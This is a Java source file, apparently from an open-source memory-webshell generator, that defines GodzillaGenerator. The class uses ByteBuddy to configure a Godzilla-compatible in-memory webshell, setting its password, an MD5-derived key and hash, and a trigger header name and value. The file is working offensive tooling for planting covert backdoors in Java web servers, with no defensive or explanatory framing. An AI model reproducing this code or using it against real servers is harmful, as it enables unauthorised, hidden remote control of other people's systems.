package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.utils.DigestUtils;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator extends ByteBuddyShellGenerator<GodzillaConfig> {

    public GodzillaGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
        super(shellConfig, godzillaConfig);
    }

    @Override
    public DynamicType.Builder<?> build(DynamicType.Builder<?> builder) {
        String md5Key = DigestUtils.md5Hex(shellToolConfig.getKey()).substring(0, 16);
        String md5 = DigestUtils.md5Hex(shellToolConfig.getPass() + md5Key).toUpperCase();
        return builder.field(named("pass")).value(shellToolConfig.getPass())
                .field(named("key")).value(md5Key)
                .field(named("md5")).value(md5)
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
    }
}